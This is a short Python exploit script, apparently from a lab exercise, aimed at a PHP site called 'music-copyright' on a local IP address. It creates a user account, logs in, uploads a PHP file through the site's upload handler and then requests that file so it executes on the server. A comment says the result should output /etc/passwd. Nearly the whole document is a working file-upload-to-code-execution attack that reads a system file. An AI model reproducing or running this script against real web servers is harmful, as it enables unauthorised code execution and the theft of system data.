# Scott Wedge
# PHP Vulnerability

"""
Python3 script that uses requests library to exploit vulnerable php code
"""

import requests #http request library

URL = "http://192.168.122.123:8015/music-copyright/"  #url for local test

# Allows requests to store session cookies
CKI = requests.Session()

# Dict to create a user account on music-copyright website
USER_DATA = {
    'first': 'user1',
    'last': 'found',
    'email': 'user1@not.com',
    'password': 'Password1'
    }

USER_R = requests.post(
    URL+"cgi-bin/account.php",
    data=USER_DATA
    )
#print(user_r.text)

# Now attempt logging in as user1
LOGIN_DATA = {
    'email': 'user1@not.com',
    'password': 'Password1'
    }

LOGIN_R = CKI.post(
    URL+"cgi-bin/login.php",
    data=LOGIN_DATA
    )
#print(login_r.text)

# Upload this file to the webserver
UPLOAD_DATA = {
    'file': open('vuln.php', 'rb')
    }

UPLOAD_R = CKI.post(
    URL+"cgi-bin/upload.php",
    files=UPLOAD_DATA
    )
#print(upload_r.text)


# Exploitable php code to execute, should output /etc/passwd
EXECUTE_R = CKI.post(
    URL+"cgi-bin/uploads/vuln.php"
    )
print(EXECUTE_R.text)
